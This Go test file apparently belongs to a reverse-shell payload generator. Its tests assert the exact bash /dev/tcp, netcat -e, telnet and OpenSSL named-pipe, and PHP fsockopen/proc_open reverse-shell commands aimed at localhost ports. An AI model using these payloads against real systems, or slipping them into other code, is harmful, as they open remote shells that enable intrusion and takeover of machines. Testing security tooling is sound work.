package reverse

import (
	"strings"
	"testing"
)

func TestBashDefault(t *testing.T) {
	payload := Bash.Default("127.0.0.1", 4444)

	if payload != "bash -c 'bash &> /dev/tcp/127.0.0.1/4444 <&1'" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestNetcatGaping(t *testing.T) {
	payload := Netcat.Default("127.0.0.1", 4444)

	if payload != "nc 127.0.0.1 4444 -e /bin/sh" {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestNetcatMknod(t *testing.T) {
	payload := Netcat.Mknod("127.0.0.1", 4444)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >") {
		t.Fatal(payload)
	}
}

func TestTelnetMknod(t *testing.T) {
	payload := Telnet.Mknod("127.0.0.1", 4444, true)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, " p; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | telnet 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)

	payload = Telnet.Mknod("127.0.0.1", 4444, false)
	if !strings.Contains(payload, "2>&1 | telnet 127.0.0.1 4444") {
		t.Fatal(payload)
	}
}

func TestTelnetMkfifo(t *testing.T) {
	payload := Telnet.Mkfifo("127.0.0.1", 4444, true)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "; telnet 127.0.0.1:4444 0<") {
		t.Fatal(payload)
	}

	t.Log(payload)

	payload = Telnet.Mkfifo("127.0.0.1", 4444, false)
	if !strings.Contains(payload, "; telnet 127.0.0.1 4444 0<") {
		t.Fatal(payload)
	}
}

func TestOpenSSLMknod(t *testing.T) {
	payload := OpenSSL.Mknod("127.0.0.1", 4444)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mknod ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, " p; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestOpenSSLMkfifo(t *testing.T) {
	payload := OpenSSL.Mkfifo("127.0.0.1", 4444)

	// random element to this one so just look for the required bits
	if !strings.Contains(payload, "cd /tmp; mkfifo ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "; sh -i < ") {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, "2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444") {
		t.Fatal(payload)
	}

	t.Log(payload)
}

func TestPHPLinuxInteractive(t *testing.T) {
	payload := PHP.LinuxInteractive("127.0.0.2", 8181)
	if !strings.Contains(payload, `$sock=fsockopen("127.0.0.2",8181);$proc=proc_open("/bin/sh -i"`) {
		t.Fatal(payload)
	}
}

func TestPHPUnflattened(t *testing.T) {
	payload := PHP.Unflattened("127.0.0.1", 8989, "/bin/sh", true)
	if !strings.Contains(payload, `stream_socket_client("tls://127.0.0.1:8989",`) {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, `proc_open("/bin/sh",`) {
		t.Fatal(payload)
	}

	payload = PHP.Unflattened("127.0.0.1", 8989, "/bin/bash", false)
	if !strings.Contains(payload, `stream_socket_client("127.0.0.1:8989",`) {
		t.Fatal(payload)
	}
	if !strings.Contains(payload, `proc_open("/bin/bash",`) {
		t.Fatal(payload)
	}
}
